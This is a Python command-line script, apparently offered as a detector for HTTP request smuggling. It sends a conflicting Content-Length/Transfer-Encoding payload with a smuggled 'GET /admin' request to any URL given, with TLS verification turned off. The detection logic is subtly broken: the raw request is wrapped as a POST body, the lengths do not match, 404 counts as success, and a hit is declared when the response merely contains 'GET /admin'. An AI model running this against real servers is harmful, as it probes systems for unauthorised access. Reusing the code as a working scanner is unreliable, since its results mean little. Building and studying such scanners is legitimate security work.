import argparse
import logging
import requests
import sys
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
DEFAULT_TIMEOUT = 10
SUCCESS_STATUS_CODES = {200, 204, 301, 302, 304, 404}  # Add more if needed
AMBIGUOUS_HEADERS = {
    "Content-Length": "10",
    "Transfer-Encoding": "chunked"
}
PAYLOAD_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: {content_length}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "{chunked_payload}\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\n"  # Smuggled request
    "Host: {host}\r\n"
    "\r\n"
)

def setup_argparse():
    """Sets up the argument parser for the CLI."""
    parser = argparse.ArgumentParser(description="Identifies HTTP desynchronization vulnerabilities.")
    parser.add_argument("url", help="The URL to test (e.g., http://example.com)")
    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser

def is_vulnerable(response):
    """
    Checks if the response indicates a potential HTTP desynchronization vulnerability.

    Args:
        response (requests.Response): The response object from the server.

    Returns:
        bool: True if a potential vulnerability is detected, False otherwise.
    """
    # Analyze the response for signs of desynchronization.
    # This is a simplified example and might need to be adjusted based on
    # the specific application and vulnerability type.

    if response.status_code not in SUCCESS_STATUS_CODES:
        return False # Assume not vulnerable if there's an outright error.

    # Example: Check for unexpected behavior based on status code, headers, and content.
    if "GET /admin" in response.text:
        return True

    return False  # Return false by default to avoid false positives


def test_http_desync(url, timeout, verbose):
    """
    Tests for HTTP desynchronization vulnerabilities.

    Args:
        url (str): The URL to test.
        timeout (int): The timeout in seconds.
        verbose (bool): Enable verbose output.

    Returns:
        bool: True if a potential vulnerability is found, False otherwise.
    """
    try:
        parsed_url = urlparse(url)
        host = parsed_url.netloc
        if not host:
            raise ValueError("Invalid URL: Hostname not found.")
        scheme = parsed_url.scheme
        if scheme not in ("http", "https"):
            raise ValueError("Invalid URL: Scheme must be http or https.")


        # Craft the payload
        content_length = 10  # Adjusted for the short message
        chunked_payload = "3\r\nGET\r\n"  # A valid chunked encoding, but might be misinterpreted


        payload = PAYLOAD_TEMPLATE.format(
            host=host,
            content_length=content_length,
            chunked_payload=chunked_payload
        ).encode('utf-8')

        if verbose:
            logging.info(f"Sending request to {url} with payload:\n{payload.decode('utf-8')}")


        # Send the request
        try:
            response = requests.post(url, data=payload, timeout=timeout, headers={
                "Content-Length": str(content_length),  # Important: Ensure Content-Length is a string
                "Transfer-Encoding": "chunked"
            }, stream=True, verify=False) # Disable SSL verification in test environments only
            response.raw.decode_content = True # Prevent auto-decoding
            response.encoding = 'utf-8'
        except requests.exceptions.Timeout:
            logging.error(f"Request timed out after {timeout} seconds.")
            return False
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            return False

        if verbose:
            logging.info(f"Received response with status code: {response.status_code}")
            logging.info(f"Response headers: {response.headers}")
            logging.info(f"Response content:\n{response.text}")


        if is_vulnerable(response):
             logging.warning("Potential HTTP desynchronization vulnerability detected!")
             return True
        else:
            logging.info("No HTTP desynchronization vulnerability detected.")
            return False

    except ValueError as e:
        logging.error(f"Invalid input: {e}")
        return False
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        return False



def main():
    """The main function of the script."""
    parser = setup_argparse()
    args = parser.parse_args()

    if not args.url:
        parser.print_help()
        sys.exit(1)

    # Input validation
    try:
        timeout = int(args.timeout)
        if timeout <= 0:
            raise ValueError("Timeout must be a positive integer.")
    except ValueError as e:
        logging.error(f"Invalid timeout value: {e}")
        sys.exit(1)

    # Run the vulnerability test
    if test_http_desync(args.url, args.timeout, args.verbose):
        print("VULNERABLE")  # Simple output for scripting
        sys.exit(1) # Exit with an error code if vulnerable
    else:
        print("NOT VULNERABLE") # Simple output for scripting
        sys.exit(0) # Exit with a success code if not vulnerable


if __name__ == "__main__":
    main()